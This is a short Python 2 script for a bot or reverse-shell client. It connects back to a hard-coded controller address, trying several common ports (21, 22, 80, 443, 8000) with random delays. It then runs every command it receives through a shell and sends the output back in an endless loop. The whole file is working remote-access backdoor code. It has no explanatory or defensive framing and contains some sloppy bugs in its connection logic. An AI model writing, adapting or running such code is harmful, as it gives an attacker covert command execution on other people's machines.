import socket
import os
import time
import urllib, urllib2
import random
import subprocess as subp

print "[+] Fire ze botz..."

def connect_back(ctrl_ip, port):
	s = socket.socket()
	s.connect((ctrl_ip,port))
	return s

def receive_cmds(connection_object):
	#Take in a command or list of commands to run
	cmd = [connection_object.recv(2048)]
	cmd = [i.strip('\n') for i in cmd]
	return cmd

def exe_cmds(cmd_list):
	cmds_out = []
	for cmd in cmd_list:
		runit = subp.Popen(cmd, shell=True, stdout=subp.PIPE, stderr=subp.PIPE, stdin=subp.PIPE)
		cur_dir = os.getcwd()
		results = cur_dir + ">" + cmd + "\n" + runit.stdout.read() + runit.stderr.read()
		cmds_out.append(results)
	return cmds_out

def send_results(connection_object, cmds_out):
	state = 'Success'
	try:
		connection_object.send(cmds_out)
	except:
		success = "Couldn't reach controller..."
	return state

def reach_controller(ctrl_ip,ports_list):
	status = False
	while not status:

		for port in ports:

			try:
				status = 'Connected'
				ctrl_connect = connect_back(ctrl_ip, port)	
				print "[+] Trying %s %s" % (port,status)		

			except Exception, e:	
				status = 'Failed...Trying next port'
				print "[*] Trying %s %s" % (port,status)

			time.sleep(random.randint(1,4))
	return ctrl_connect

def main(ctrl_ip,ports_list):
	controller = reach_controller(ctrl_ip,ports_list)

	while True:
		cmds = receive_cmds(controller)

		if cmds:
			cmd_output = exe_cmds(cmds)
		try:
			for cmd in cmd_output:
				send_results(controller,cmd)
		except Exception, e:
				print str(e)

if __name__ == "__main__":
	ports = [21,22,80,443,8000]
	ctrl_ip = "10.25.0.117"
	main(ctrl_ip,ports)
	
